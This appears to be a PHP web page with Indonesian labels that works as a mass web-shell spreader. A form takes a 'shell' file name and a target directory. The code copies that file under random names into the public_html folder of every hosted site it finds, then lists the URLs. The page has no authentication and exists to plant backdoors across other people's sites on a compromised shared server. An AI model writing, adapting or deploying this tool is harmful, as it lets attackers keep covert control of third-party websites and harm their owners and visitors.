<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload File PHP</title>
</head>
<body>
    <?php
    // Menampilkan direktori saat ini
    $current_directory = getcwd();
    echo "<p>Direktori Saat Ini: " . htmlspecialchars($current_directory) . "</p>";
    ?>

    <form action="" method="get">
        <label for="source_file">Masukkan Nama Shell:</label>
        <input type="text" id="source_file" name="source_file" required>
        <br><br>
        <label for="target_path">Masukkan Path Tujuan:</label>
        <input type="text" id="target_path" name="target_path" required>
        <br><br>
        <input type="submit" value="Unggah">
    </form>

    <?php
    // Mengambil input dari pengguna
    $source_file = isset($_GET['source_file']) ? $_GET['source_file'] : ''; // Nama file dari input pengguna
    $target_path = isset($_GET['target_path']) ? $_GET['target_path'] : ''; // Path tujuan dari input pengguna

    // Pastikan input file dan path tujuan tidak kosong
    if (!empty($source_file) && file_exists($source_file) && !empty($target_path)) {
        // Pastikan path tujuan adalah direktori valid
        if (is_dir($target_path)) {
            // Membaca isi direktori target_path
            if ($dh = opendir($target_path)) {
                echo "Mengunggah file ke subdirektori di dalam " . htmlspecialchars($target_path) . ":<br>";

                // Iterasi setiap subdirektori dalam target_path
                while (($dir = readdir($dh)) !== false) {
                    $subdir = $target_path . DIRECTORY_SEPARATOR . $dir;

                    // Abaikan . dan .. serta hanya proses subdirektori
                    if ($dir != '.' && $dir != '..' && is_dir($subdir)) {
                        // Cek apakah subdirektori memiliki folder public_html
                        $public_html_path = $subdir . DIRECTORY_SEPARATOR . 'public_html';

                        if (is_dir($public_html_path)) {
                            // Jika terdapat public_html, upload ke public_html
                            $random_name = uniqid(true) . basename($source_file);
                            $destination = $public_html_path . DIRECTORY_SEPARATOR . $random_name;

                            if (copy($source_file, $destination)) {
                                echo "http://" . htmlspecialchars($dir . '/' .  $random_name) . "<br>";
                            } else {
                                echo "Gagal mengunggah file ke public_html di " . htmlspecialchars($dir) . ".<br>";
                            }
                        } else {
                            // Jika tidak ada public_html, upload ke subdirektori itu sendiri
                            $random_name = uniqid(true) . basename($source_file);
                            $destination = $subdir . DIRECTORY_SEPARATOR . $random_name;

                            if (copy($source_file, $destination)) {
                                echo "http://" . htmlspecialchars($dir . '/' . $random_name) . "<br>";
                            } else {
                                echo "Gagal mengunggah file ke " . htmlspecialchars($dir) . ".<br>";
                            }
                        }
                    }
                }
                closedir($dh);
            } else {
                echo "Tidak dapat membuka direktori tujuan.";
            }
        } else {
            echo "Path tujuan tidak valid: " . htmlspecialchars($target_path) . "<br>";
        }
    } else {
        echo "File sumber tidak ditemukan atau path tujuan kosong.";
    }
    ?>
</body>
</html>
